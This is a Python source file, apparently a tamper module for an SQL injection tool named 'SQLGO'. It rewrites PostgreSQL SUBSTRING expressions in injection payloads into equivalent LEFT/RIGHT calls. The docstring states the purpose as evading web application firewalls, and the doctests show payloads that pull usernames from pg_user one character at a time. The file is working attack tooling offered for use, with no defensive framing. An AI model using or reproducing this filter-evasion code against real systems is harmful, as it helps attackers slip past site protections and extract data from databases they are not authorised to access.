#!/usr/bin/env python
"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import re



def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT

    Tested against:
        * PostgreSQL 9.6.12

    Note:
        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)

    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')
    'LEFT((SELECT usename FROM pg_user)::text,1)'
    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')
    'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'
    """

    retVal = payload

    if payload:
        match = re.search(r"SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)", payload)

        if match:
            pos = int(match.group(2))
            if pos == 1:
                _ = "LEFT(%s,1)" % (match.group(1))
            else:
                _ = "LEFT(RIGHT(%s,%d),1)" % (match.group(1), 1 - pos)

            retVal = retVal.replace(match.group(0), _)

    return retVal